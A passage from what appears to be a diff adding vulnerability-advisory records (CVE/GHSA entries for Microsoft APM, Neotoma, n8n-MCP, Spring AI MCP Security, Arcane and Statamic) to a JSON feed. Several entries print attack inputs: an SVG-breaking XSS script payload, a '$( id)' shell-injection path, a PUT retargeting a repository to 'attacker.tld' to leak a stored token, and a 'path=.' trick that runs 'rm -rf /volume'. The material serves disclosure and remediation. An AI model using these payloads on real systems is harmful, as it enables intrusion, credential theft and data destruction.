apm_modules/poc-author/helpful-agents/.apm/agents/notes.agent.md\n# lrwxrwxrwx ... .apm/agents/notes.agent.md -> /tmp/poc_secret\n```\n\nThe deploy roots receive plain regular files containing the sentinel:\n\n- `.github/agents/notes.agent.md`\n- `.github/prompts/welcome.prompt.md`\n- `.claude/agents/notes.md`\n- `.cursor/agents/notes.md`\n- `.codex/agents/notes.toml`\n- `.windsurf/skills/notes/SKILL.md`\n\nExample:\n\n```bash\ncat /tmp/poc/victim_project/.claude/agents/notes.md\n# APM-AUDIT-SENTINEL-X7Y2Q9-NOT-A-REAL-CREDENTIAL\n```\n\nThe deployed files persist after the original symlink target is removed:\n\n```bash\nrm /tmp/poc_secret\ncat /tmp/poc/victim_project/.claude/agents/notes.md\n# APM-AUDIT-SENTINEL-X7Y2Q9-NOT-A-REAL-CREDENTIAL\n```\n\n## Defenses that did not flag the result\n\n- The pre-deploy `SecurityGate.scan_files` walks with `followlinks=False` and continues past `is_symlink()` files. The symlinked source is not scanned.\n- `apm audit` against the post-install tree reports no findings.\n- The auto-written `.gitignore` contains only `apm_modules/`. The deploy roots are not excluded, and `git add -A` stages all deployed files alongside `apm.lock.yaml`.\n- The package `content_hash` is computed before symlink resolution and remained stable across installs whose resolved deployed bytes differed.\n\n## Impact\n\nThe directly demonstrated impact is file-content disclosure.\n\nAny file readable by the user running `apm install` can be selected by the package author through an absolute symlink target committed inside the dependency, and its contents are then written into the project's deploy directories as regular files.\n\n### Realistic downstream consequences\n\nThese were not separately demonstrated with real secrets, but they follow from the validated behavior:\n\n- The deploy directories (`.github/`, `.claude/`, `.cursor/`, `.codex/`, `.windsurf/`) are project-tracked by convention, and the auto-generated `.gitignore` does not exclude them.\n- In automation that regenerates and commits agent context, the leaked files can be pushed without human review.\n- A symlink target such as `/proc/self/environ` would resolve to the APM process environment at install time.\n\n## Why this is security-relevant and not intended behavior\n\nThis is not just \"a malicious package being malicious.\"\n\nThe codebase already contains the correct defense in `BaseIntegrator.find_files_by_glob()`, and that helper explicitly rejects symlinks, hardlinks, and containment escapes. `InstructionIntegrator` uses it. `PromptIntegrator` and `AgentIntegrator` do not.\n\nThe codebase also documents that preserving symlinks inside `apm_modules/` is acceptable only because the links are supposed to remain inert unless a consumer tool follows them safely. Here, APM itself is the consumer tool that follows them unsafely.\n\nThat architectural asymmetry makes this look like an implementation oversight, not intended behavior.\n\n## Recommended fix\n\nRoute both affected finders through the existing safe helper.\n\n```python\n# src/apm_cli/integration/prompt_integrator.py\ndef find_prompt_files(self, package_path: Path) -> list[Path]:\n    return self.find_files_by_glob(\n        package_path, \"*.prompt.md\", subdirs=[\".apm/prompts\"]\n    )\n```\n\n```python\n# src/apm_cli/integration/agent_integrator.py\ndef find_agent_files(self, package_path: Path) -> list[Path]:\n    files: list[Path] = []\n    files += self.find_files_by_glob(package_path, \"*.agent.md\")\n    files += self.find_files_by_glob(package_path, \"*.chatmode.md\")\n    files += self.find_files_by_glob(\n        package_path, \"*.agent.md\", subdirs=[\".apm/agents\"]\n    )\n    files += self.find_files_by_glob(\n        package_path, \"*.md\", subdirs=[\".apm/agents\"]\n    )\n    files += self.find_files_by_glob(\n        package_path, \"*.chatmode.md\", subdirs=[\".apm/chatmodes\"]\n    )\n    return files\n```\n\n### Optional defense in depth\n\n- In `copy_prompt`, `copy_agent`, `_write_codex_agent`, and `_write_windsurf_agent_skill`, explicitly raise on `source.is_symlink()` before reading.\n- Treat any symlink under a dependency's `.apm/` tree as a security finding during scanning.\n\n## Regression test idea\n\nAdd unit tests that create a fixture package with symlinks under `.apm/prompts/`, `.apm/agents/`, and `.apm/chatmodes/`, then assert that the symlink entries are filtered out before any read occurs.\n\nExample shape:\n\n```python\ndef test_symlink_under_apm_prompts_is_rejected(tmp_path):\n    pkg = tmp_path / \"pkg\"\n    (pkg / \".apm/prompts\").mkdir(parents=True)\n\n    sentinel = tmp_path / \"sentinel.txt\"\n    sentinel.write_text(\"REGRESSION-SENTINEL\")\n\n    (pkg / \".apm/prompts/leak.prompt.md\").symlink_to(sentinel)\n\n    result = PromptIntegrator().find_prompt_files(pkg)\n\n    assert all(not p.is_symlink() for p in result)\n    assert not any(p.name == \"leak.prompt.md\" for p in result)\n```\n\nA second test should mirror the same pattern for `AgentIntegrator.find_agent_files()`.",
+      "first_seen": "2026-05-18T16:31:44.441623+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441623+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-q5pp-gvjg-h7v4",
+        "https://github.com/microsoft/apm/commit/f85b9f54ad303159f9c448268eb7005c319fe02a",
+        "https://github.com/microsoft/apm/releases/tag/v0.13.0",
+        "https://github.com/microsoft/apm/security/advisories/GHSA-q5pp-gvjg-h7v4",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-45539"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Microsoft APM: Symlinks under `.apm/prompts/` and `.apm/agents/` are dereferenced during `apm install`, copying host-local file contents into the project tree"
+    },
+    {
+      "canonical_id": "CVE-2026-45577",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-288",
+        "CWE-306"
+      ],
+      "description": "Neotoma versions starting at v0.6.0 can treat public reverse-proxied requests as local when the app receives them over a loopback socket and no Bearer token is present.\n\nIn affected deployments, the REST auth middleware can resolve unauthenticated requests as the local development user, making the hosted Inspector and related API surface reachable without credentials.\n\nImpact: unauthorized access to production data exposed through the Inspector/API on affected deployments.\n\nAffected condition: a public deployment behind a reverse proxy or same-host tunnel that forwards traffic to the Node process over loopback.\n\nRemediation implemented on the main branch: local-request detection now fails closed in production unless loopback trust is explicitly enabled, and forwarded public clients remain remote.\n\nPatched release version is pending; this draft will be updated once the fix is released.",
+      "first_seen": "2026-05-18T16:31:44.440871+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440871+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-5cvp-p7p4-mcx9",
+        "https://github.com/markmhendrickson/neotoma/releases/tag/v0.11.1",
+        "https://github.com/markmhendrickson/neotoma/security/advisories/GHSA-5cvp-p7p4-mcx9"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Neotoma: Unauthenticated Inspector/API access via reverse-proxy loopback auth bypass"
+    },
+    {
+      "canonical_id": "CVE-2026-45582",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-201"
+      ],
+      "description": "## Summary\n\nIn affected versions of n8n-mcp, the workflow telemetry sanitizer could retain partial fragments of URL-shaped node parameters before sending workflow data to the project's anonymous telemetry backend. Values placed in HTTP-Request-style node parameters \u2014 such as customer or tenant identifiers, short secrets embedded in query strings, and signed request parameters \u2014 could therefore appear in stored telemetry, contrary to the collection boundary documented in `PRIVACY.md`.\n\n## Impact\n\nOperators with access to the project's telemetry backend could read partial fragments of workflow URL parameters that should not have been collected. The bug was scoped to URL-shaped fields in workflow *definitions*; credentials, OAuth tokens, and workflow *execution* data are not affected \u2014 credentials are removed by a separate code path, and long secrets and known-provider tokens are matched by dedicated patterns.\n\n## Patches\n\nFixed in **n8n-mcp `2.51.3`**. Upgrading is the recommended remediation.\n\n## Workarounds\n\nFor users who cannot upgrade immediately, disable anonymous telemetry by setting any of these environment variables to `true`:\n\n- `N8N_MCP_TELEMETRY_DISABLED`\n- `TELEMETRY_DISABLED`\n- `DISABLE_TELEMETRY`\n\n## Credit\n\nReported by @u-ktdi.",
+      "first_seen": "2026-05-18T16:31:44.441561+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441561+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-f3rg-xqjj-cj9w",
+        "https://github.com/czlonkowski/n8n-mcp/commit/6cf6fef653fcd6d598f2f356aac4754931c7329f",
+        "https://github.com/czlonkowski/n8n-mcp/pull/782",
+        "https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.51.3",
+        "https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-f3rg-xqjj-cj9w"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "n8n-MCP: Workflow telemetry sanitizer could retain partial values from URL-shaped node parameters"
+    },
+    {
+      "canonical_id": "CVE-2026-45609",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "### Summary\n\nThe mcp-security framework fails to implement the mandatory SSRF mitigations outlined in the Model Context Protocol (MCP) [security specifications](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#mitigation-3). Specifically, it processes untrusted URLs for OAuth-related discovery and metadata without verifying if the targets are malicious or internal to the network.\n\nThis only affects installations with Dynamic Client Registration (DCR) enabled:\n\n```properties\nspring.ai.mcp.client.authorization.dynamic-client-registration.enabled=true\n```\n\nDCR does not validate URLs exposed by MCP Servers (protected resource metadata URL, authorization server URL) and Authorization Servers (all OAuth2 endpoints).\n\n### Workaround\n\nWhen users need to perform DCR, they may provide their own `McpOAuth2ClientManager`. Both `McpMetadataDiscoveryService` and `DynamicClientRegistrationService` are also affected, if used, users should provide their own subclasses.\n\nAlternatively, users can provide the default implementations of these classes with a `RestClient` that implements URL filtering through `ClientHttpRequestInterceptor`.",
+      "first_seen": "2026-05-18T16:31:44.441496+00:00",
+      "frameworks": [
+        "maven"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441496+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-qjp4-4jvr-xqg3",
+        "https://github.com/spring-ai-community/mcp-security/commit/e6b67d8a67cd7acbee6e4c0741c385d62e3ed576",
+        "https://github.com/spring-ai-community/mcp-security/pull/68",
+        "https://github.com/spring-ai-community/mcp-security/releases/tag/v0.1.9",
+        "https://github.com/spring-ai-community/mcp-security/security/advisories/GHSA-qjp4-4jvr-xqg3"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Spring AI MCP Security: Unvalidated URL Fetching (SSRF)"
+    },
+    {
+      "canonical_id": "CVE-2026-45625",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-862"
+      ],
+      "description": "## Summary\n\nArcane's huma-based REST API exposes nine endpoints under `/api/customize/git-repositories` and `/api/git-repositories/sync` for managing GitOps source repositories and their stored credentials. Eight of those endpoints (`list`, `create`, `get`, `update`, `delete`, `test`, `listBranches`, `browseFiles`) never call the `checkAdmin(ctx)` helper that every other admin-managed resource (container registries, environments, users, API keys, swarm, settings, system, notifications, events) uses, and the huma authentication middleware deliberately enforces only authentication, not the `admin` role. As a result, any logged-in user with the default `user` role can list, create, modify, delete, and test git repository configurations. By repointing an existing repository's URL to an attacker-controlled host while omitting the `token`/`sshKey` fields (which `UpdateRepository` only rewrites when explicitly supplied), the attacker causes Arcane to decrypt the legitimate PAT/SSH key on its next `/test`, `/branches`, or `/files` call and present it as HTTP Basic auth (or SSH key auth) to the attacker's host \u2014 producing a one-step exfiltration of plaintext Git credentials.\n\n## Details\n\n### Auth bridge does not enforce role\n\n`backend/internal/huma/middleware/auth.go:192-254` (`NewAuthBridge`) validates Bearer JWTs / API keys / agent tokens and stores the user (and an `userIsAdmin` flag) in the request context, but it never rejects non-admin callers \u2014 admin enforcement is intentionally delegated to handlers via `helpers.checkAdmin`:\n\n```go\n// backend/internal/huma/handlers/helpers.go:11-12\n// checkAdmin checks if the current user is an admin and returns a 403 error if not.\nfunc checkAdmin(ctx context.Context) error { ... }\n```\n\n`grep -rn \"checkAdmin\"` confirms every other admin resource uses it (container_registries, environments, users, apikeys, events, settings, swarm, system, notifications). Default new accounts get role `\"user\"` (`backend/internal/huma/handlers/users.go:222-223`):\n\n```go\nif userModel.Roles == nil {\n    userModel.Roles = []string{\"user\"}\n}\n```\n\n### Git repository handler is missing the admin gate on 8 of 9 endpoints\n\n`backend/internal/huma/handlers/git_repositories.go:117-236` registers nine endpoints. Only `SyncRepositories` (line 456) calls `checkAdmin(ctx)`. The other handlers \u2014 `ListRepositories` (line 243), `CreateRepository` (271), `GetRepository` (301), `UpdateRepository` (326), `DeleteRepository` (356), `TestRepository` (382), `ListBranches` (407), `BrowseFiles` (428) \u2014 perform no role check whatsoever:\n\n```go\n// backend/internal/huma/handlers/git_repositories.go:326-336\nfunc (h *GitRepositoryHandler) UpdateRepository(ctx context.Context, input *UpdateGitRepositoryInput) (*UpdateGitRepositoryOutput, error) {\n    if h.repoService == nil {\n        return nil, huma.Error500InternalServerError(\"service not available\")\n    }\n    actor := models.User{}\n    if currentUser, exists := humamw.GetCurrentUserFromContext(ctx); exists && currentUser != nil {\n        actor = *currentUser\n    }\n    repo, err := h.repoService.UpdateRepository(ctx, input.ID, input.Body, actor)\n    ...\n```\n\nThe service layer (`backend/internal/services/git_repository_service.go`) has no role enforcement either \u2014 `grep -n \"admin\" backend/internal/services/git_repository_service.go` returns nothing.\n\n### Credential-preserving update primitive\n\n`UpdateRepository` builds a partial update map: the `token`/`ssh_key` columns are only rewritten if the corresponding pointer in the request body is non-nil, while the URL is updated unconditionally when `req.URL != nil`:\n\n```go\n// backend/internal/services/git_repository_service.go:185-219\nupdates := make(map[string]any)\nif req.Name != nil      { updates[\"name\"] = *req.Name }\nif req.URL != nil       { updates[\"url\"]  = *req.URL }   // <-- attacker-pivotable\nif req.AuthType != nil  { updates[\"auth_type\"] = *req.AuthType }\n...\nif req.Token != nil {                                      // <-- only rewritten if supplied\n    if *req.Token == \"\" { updates[\"token\"] = \"\" } else {\n        encrypted, err := crypto.Encrypt(*req.Token)\n        ...\n        updates[\"token\"] = encrypted\n    }\n}\n```\n\nSo `PUT /customize/git-repositories/{id}` with body `{\"url\":\"https://attacker.tld/repo.git\"}` retargets the repository while preserving the encrypted token.\n\n### Sink: Basic-auth send to attacker URL\n\n`TestConnection` and `ListBranches`/`BrowseFiles` decrypt the stored token via `GetAuthConfig` and pass the chosen URL + auth to `gitutil`:\n\n```go\n// backend/internal/services/git_repository_service.go:340-363\nfunc (s *GitRepositoryService) GetAuthConfig(ctx context.Context, repository *models.GitRepository) (git.AuthConfig, error) {\n    authConfig := git.AuthConfig{\n        AuthType: repository.AuthType, Username: repository.Username, ...\n    }\n    if repository.Token != \"\" {\n        token, err := crypto.Decrypt(repository.Token)\n        ...\n        authConfig.Token = token\n    }\n    ...\n}\n```\n\n```go\n// backend/pkg/gitutil/git.go:60-69\ncase \"http\":\n    if config.Token != \"\" {\n        return &githttp.BasicAuth{\n            Username: config.Username,\n            Password: config.Token,\n        }, nil\n    }\n```\n\n`go-git`'s HTTP transport sends `Authorization: Basic base64(username:token)` in the very first reference-discovery request to the (attacker-controlled) URL \u2014 so the cleartext PAT lands in the attacker's web-server access log on the first call to `/test`, `/branches`, or `/files`.\n\n### Full attack chain (HTTP-token variant)\n\n1. Attacker authenticates as a normal `user` (registration or any pre-existing low-priv account).\n2. `GET /api/customize/git-repositories` enumerates all configured repositories (id, url, authType, username \u2014 token/sshKey are encrypted but their *existence* is visible).\n3. `PUT /api/customize/git-repositories/{id}` with `{\"url\":\"https://attacker.tld/repo.git\"}` retargets the repo while preserving the encrypted PAT.\n4. `POST /api/customize/git-repositories/{id}/test` (or `GET .../branches`) makes Arcane decrypt the PAT and send it to `attacker.tld` as HTTP Basic auth.\n5. Optional cleanup: `PUT` again to restore the original URL, leaving no obvious config drift; or `DELETE` every repo for DoS on the GitOps pipeline.\n\nThe same primitive works for `authType: \"ssh\"` repos by retargeting to an attacker-controlled SSH endpoint that logs the offered key (or, with the default `accept_new` host-key mode, by the attacker simply observing the SSH session).\n\n## Impact\n\n- **Cleartext exfiltration of stored Git credentials.** PATs and SSH keys configured by administrators for source-of-truth GitOps repositories are encrypted at rest with a key Arcane controls, but any authenticated low-priv user can cause the application to decrypt them and transmit them to an attacker-chosen URL. Stolen GitHub/GitLab PATs typically grant write access to the org's source repos, CI secrets, container registries, and downstream production systems \u2014 escaping Arcane's security boundary entirely (S:C).\n- **Privilege escalation to effective Arcane admin over GitOps.** Non-admin users can create, modify, and delete every git repository configuration, controlling what code Arcane pulls and deploys.\n- **Supply-chain integrity loss.** A user can swap the URL of an enabled repo to a malicious fork, then revert it after a sync, to inject attacker-controlled images/manifests into deployments.\n- **Denial of service on the GitOps pipeline.** `DELETE /customize/git-repositories/{id}` lets any user wipe production repository configurations.\n- **Information disclosure of private repo contents.** `GET .../files` clones private repos using stored credentials and returns file contents in the API response, regardless of caller role.\n\nDefault Arcane installations create new accounts with role `user`; no special configuration is required for the attack to be reachable.",
+      "first_seen": "2026-05-18T16:31:44.441370+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441370+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-7h26-hg47-p9hx",
+        "https://github.com/getarcaneapp/arcane/security/advisories/GHSA-7h26-hg47-p9hx"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Arcane Backend: Missing admin authorization on git repository endpoints allows non-admin users to exfiltrate stored Git credentials and tamper with GitOps configs"
+    },
+    {
+      "canonical_id": "CVE-2026-45626",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-78"
+      ],
+      "description": "## Summary\n\n`GET /environments/{id}/volumes/{volumeName}/browse` accepts a `path` query parameter that is passed to a shell command (`sh -c \"find \u2026 | while \u2026\"`) inside an Arcane helper container. The path sanitiser blocks `../` traversal but does not strip Bourne-shell metacharacters such as `$()` or backticks, and `strconv.Quote` only escapes Go string metacharacters, not shell substitution sequences. Any authenticated user with access to a browseable volume can execute arbitrary commands inside the helper container; command output is reflected back in the 500 error body.\n\n## Details\n\nThe execution flow is:\n\n1. `BrowseDirectoryInput.Path` (query: `path`) \u2014 `backend/internal/huma/handlers/volumes.go:148`\n2. `VolumeHandler.BrowseDirectory` calls `volumeService.ListDirectory(ctx, volumeName, input.Path)` \u2014 `backend/internal/huma/handlers/volumes.go:858-865`. Note the route registration at line 412\u2013419 only declares `BearerAuth`/`ApiKeyAuth`; there is no `checkAdmin(ctx)` call (compare with `customize.go`, `system.go`, `swarm.go`, etc., which do enforce admin).\n3. `VolumeService.ListDirectory` runs the user-supplied path through `sanitizeBrowsePathInternal`, then joins it under `/volume`, quotes it with `strconv.Quote`, and embeds it into a `sh -c` command:\n\n```go\n// backend/internal/services/volume_service.go:286-300\nsanitizedPath, err := s.sanitizeBrowsePathInternal(dirPath)\n...\ntargetPath := path.Join(\"/volume\", sanitizedPath)\nquotedPath := strconv.Quote(targetPath)\ncmd := []string{\"sh\", \"-c\", fmt.Sprintf(\n    \"find %s -mindepth 1 -maxdepth 1 | while IFS= read -r f; do out=$(stat -c \\\"%%s %%Y %%f %%A\\\" -- \\\"$f\\\" 2>/dev/null) || continue; printf \\\"%%s\\\\0%%s\\\\0\\\" \\\"$f\\\" \\\"$out\\\"; done\",\n    quotedPath)}\nstdout, _, err := s.execInContainerInternal(ctx, containerID, cmd)\n```\n\nThe sanitiser is insufficient (`backend/internal/services/volume_service.go:1448-1467`):\n\n```go\nfunc (s *VolumeService) sanitizeBrowsePathInternal(input string) (string, error) {\n    trimmed := strings.TrimSpace(input)\n    if trimmed == \"\" || trimmed == \"/\" { return \"/\", nil }\n    cleaned := path.Clean(trimmed)\n    if !path.IsAbs(cleaned) { cleaned = \"/\" + cleaned }\n    if strings.Contains(cleaned, \"/../\") || strings.HasSuffix(cleaned, \"/..\") || cleaned == \"/..\" {\n        return \"\", fmt.Errorf(\"invalid path: path traversal not allowed\")\n    }\n    if !strings.HasPrefix(cleaned, \"/\") { return \"\", fmt.Errorf(\"invalid path: must be absolute\") }\n    return cleaned, nil\n}\n```\n\nOnly `../` patterns are filtered. `$(...)`, backticks, `;`, `&`, `|`, `>`, etc. all pass through unchanged. `strconv.Quote` then wraps the path in Go-style double quotes, which `sh -c` interprets as a regular double-quoted string \u2014 and bash performs `$(...)` command substitution inside double quotes.\n\nFor the input `/$( id)`:\n- `sanitizeBrowsePathInternal` returns `/$( id)` (no `../` present).\n- `path.Join(\"/volume\", \"/$( id)\")` \u2192 `/volume/$( id)`.\n- `strconv.Quote(...)` \u2192 `\"/volume/$( id)\"`.\n- The shell runs `find \"/volume/$( id)\" \u2026`, which expands to `find \"/volume/uid=0(root) gid=0(root) groups=0(root)\" \u2026`. `find` fails because that path does not exist; the stderr containing the substituted command output is propagated by `execInContainerInternal` (volume_service.go:910-918) into a `command exited with code N: \u2026` error, then re-wrapped by `ListDirectory` and returned to the client as a 500 response body.\n\nErrors from the handler at `volumes.go:863-864` are returned via `huma.Error500InternalServerError(err.Error())`, so the substituted output is reflected in plaintext.\n\n**Blast radius / mitigations actually present:**\n- The helper container is created by `createTempContainerInternal` with `NetworkDisabled: true`, no privileged mode, no Docker socket mount, only the target Docker volume bind-mounted (`:ro` for browse). It is auto-removed.\n- Therefore the injection executes inside an isolated, network-disabled container that already has read access to the same files the browse API exposes.\n- However: the injection grants arbitrary command execution within that container (well beyond the find/stat/readlink/head primitives the API exposes), enables data exfiltration via error-message side channel, and lets an attacker probe the helper image / volume in ways the legitimate API forbids (e.g. read symlink targets the API explicitly censors at `volume_service.go:336-356`, read past size limits, etc.).\n- A non-admin authenticated Arcane user is sufficient (no role check on the volumes browser routes), which makes this a privilege/capability extension for users who otherwise cannot run arbitrary `docker exec`.\n\n**Secondary issue (same sanitiser):** `DeleteFile` (`volume_service.go:924-963`) defends against deleting volume root with `if sanitizedPath == \"/\"`. Input `path=.` yields `path.Clean(\".\") == \".\"` \u2192 prefixed to `/.`, which fails the `== \"/\"` check, then `path.Join(\"/volume\", \"/.\") == \"/volume\"`, so the executed command is `rm -rf /volume`, recursively deleting all volume contents. This is a separate logic flaw worth fixing alongside the sanitiser hardening but is reported here only for completeness.\n\n## Impact\n\n- Authenticated user (any role, including non-admin) can execute arbitrary shell commands inside the per-volume helper container.\n- Output of those commands is reflected in HTTP 500 error bodies \u2014 usable as an exfiltration channel.\n- Attacker gains capabilities the legitimate API withholds: bypass the symlink-target censoring at `volume_service.go:336-356`, bypass per-file byte limits, enumerate the helper image, mount-time inspection, etc.\n- No host compromise: the container has `NetworkDisabled: true`, no privileged flag, no Docker socket; the volume is bind-mounted read-only for browse. Confidentiality/integrity/availability impact is therefore limited (CVSS C:L / I:L / A:L) but real.\n- The same insufficient sanitiser additionally permits a destructive `rm -rf /volume` by sending `path=.` to `DELETE /environments/{id}/volumes/{volumeName}/browse`, which any authenticated user can also reach.",
+      "first_seen": "2026-05-18T16:31:44.440987+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440987+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-9mvm-4gwg-v8mp",
+        "https://github.com/getarcaneapp/arcane/security/advisories/GHSA-9mvm-4gwg-v8mp"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Arcane Backend: OS Command Injection in Volume Browser ListDirectory via path query parameter"
+    },
+    {
+      "canonical_id": "CVE-2026-45627",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "## Summary\n\nThe unauthenticated `GET /api/app-images/logo` endpoint reflects a user-supplied `color` query parameter into the body of an SVG document via `strings.ReplaceAll` with no escaping. The substitution lands inside a `<style>` element of the embedded `logo.svg`, allowing an attacker to close the style block and inject executable `<script>` content. Because the response is served as `image/svg+xml` and Arcane sets no Content-Security-Policy or `X-Content-Type-Options` headers, navigating a logged-in admin victim to a crafted URL executes attacker-controlled JavaScript in Arcane's origin and rides the victim's HttpOnly JWT cookie to fully compromise the admin account.\n\n## Details\n\nThe route is registered in `backend/internal/huma/handlers/appimages.go:53-61` with an explicitly empty security requirement, marking it as public:\n\n```go\nhuma.Register(api, huma.Operation{\n    OperationID: \"get-logo\",\n    Method:      http.MethodGet,\n    Path:        \"/app-images/logo\",\n    ...\n    Security:    []map[string][]string{}, // explicit: no auth\n}, h.GetLogo)\n```\n\n`backend/internal/huma/middleware/auth.go:209-213` honors the empty `Security` value by returning `reqs.isRequired == false` and short-circuiting with `next(ctx)`, so no JWT/API-key check runs.\n\n`GetLogoInput.Color` (`appimages.go:23`) is declared with no validation tags:\n\n```go\ntype GetLogoInput struct {\n    Full  bool   `query:\"full\" default:\"false\" ...`\n    Color string `query:\"color\" doc:\"Optional accent color override ...\"`\n}\n```\n\nThe handler passes the value straight through `getImageWithColor` \u2192 `ApplicationImagesService.GetImageWithColor` \u2192 `applyAccentColorToSVG` (`backend/internal/services/app_images_service.go:79-105`):\n\n```go\nsvgStr = strings.ReplaceAll(svgStr, \"fill:#6D28D9\", fmt.Sprintf(\"fill:%s\", accentColor))\nsvgStr = strings.ReplaceAll(svgStr, \"fill:#6d28d9\", fmt.Sprintf(\"fill:%s\", accentColor))\n```\n\nThe bundled `backend/resources/images/logo.svg` contains:\n\n```xml\n<style id=\"style1\" type=\"text/css\">.st0{fill:#6d28d9}</style>\n```\n\nso a `color` value like `red}</style><script>fetch('/api/users',...)</script><style>x{` produces a valid SVG that closes the `<style>` element and embeds a `<script>` element. The response Content-Type is `image/svg+xml` (from `pkg/utils/image/image_util.go`), and a grep of the backend confirms no `Content-Security-Policy`, `X-Content-Type-Options`, or framing headers are emitted on any route.\n\nBrowsers execute scripts in SVG documents loaded as top-level navigations or via `<iframe src=\u2026>` / `window.open(\u2026)`. The execution context is `origin(arcane-host)`, so the victim's `__Host-token` / `token` HttpOnly JWT cookie (recognized by `extractTokenFromCookieHeaderInternal` at `auth.go:274-286`) is automatically attached to subsequent same-origin `fetch()` calls. From there the attacker can invoke any privileged API the victim possesses \u2014 most damagingly `POST /api/users` to create a new admin account, after which the attacker has standalone admin access to manage Docker containers, registries, GitOps secrets, and SSH/registry credentials stored by Arcane.\n\n## Impact\n\n- Same-origin script execution from an unauthenticated, reachable URL \u2014 only user interaction (clicking/visiting the crafted link) is required.\n- Full session-riding against any authenticated user, including admins. Because Arcane manages Docker daemons, container exec, image registries, and GitOps repositories, an attacker who lands script execution as an admin victim can:\n  - Create persistent attacker-controlled admin accounts via `POST /api/users`.\n  - Read/modify secrets stored in environments, registries, and Git repositories the admin can access.\n  - Start or exec into containers on connected Docker hosts.\n- HttpOnly cookies do not mitigate the issue \u2014 cookies are auto-attached to same-origin `fetch()`. Absence of CSP and `X-Content-Type-Options: nosniff` removes available defenses-in-depth.\n\nDefense-in-depth \u2014 add to all responses (and especially to `/api/app-images/*`):\n\n- `X-Content-Type-Options: nosniff`\n- `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self' data:` on the SVG image responses (or the most permissive policy compatible with the frontend on app routes).\n- Consider serving these images with `Content-Disposition: inline` and from a separate cookie-less origin to remove the same-origin session-riding primitive entirely.\n\nAlso enforce the same allowlist on the settings write path (`SettingsService` \u2192 `AccentColor`) so a stored XSS variant cannot be introduced via the settings API.",
+      "first_seen": "2026-05-18T16:31:44.440903+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440903+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-q2pj-8v84-9mh5",
+        "https://github.com/getarcaneapp/arcane/security/advisories/GHSA-q2pj-8v84-9mh5"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Arcane Backend: Unauthenticated reflected XSS via SVG color parameter enables admin account takeover"
+    },
+    {
+      "canonical_id": "CVE-2026-45660",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "### Impact\n\nThe Glide image proxy's URL validation could be bypassed using an IP representation that wasn't normalized before the public-IP check. An unauthenticated user could cause the server to make HTTP requests to internal addresses \u2014 including loopback, private network, and cloud metadata endpoints.\n\nThis affects sites that pass user-supplied URLs to Glide. Sites running PHP 8.3 or newer are not affected.\n\n### Patches\n\nThis has been fixed in 5.73.22 and 6.18.1",
+      "first_seen": "2026-05-18T16:31:44.440807+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440807+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-pf9c-ch8r-2958",
+        "https://github.com/statamic/cms/security/advisories/GHSA-pf9c-ch8r-2958"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Statamic CMS: Server-Side Request Forgery via Glide"
+    },
+    {
+      "canonical_id": "CVE-2026-46510",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1321"
+      ],
